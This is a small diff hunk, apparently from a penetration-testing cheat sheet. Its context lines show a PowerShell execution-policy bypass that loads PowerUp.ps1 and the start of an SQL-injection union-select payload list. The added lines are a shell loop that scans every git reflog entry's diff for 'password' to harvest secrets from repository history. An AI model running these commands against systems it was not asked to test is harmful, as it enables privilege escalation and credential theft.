@@ -148,6 +148,9 @@ powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-All
 • git commit -m “Add”
 • git push
 
+[ git: grep password]
+$ for commit in $(seq 1 $(git reflog | wc -l)); do git diff HEAD@{$commit} 2>/dev/null | grep password; done
+
 [sqli union select payloads]
 1. database()
 2. user()
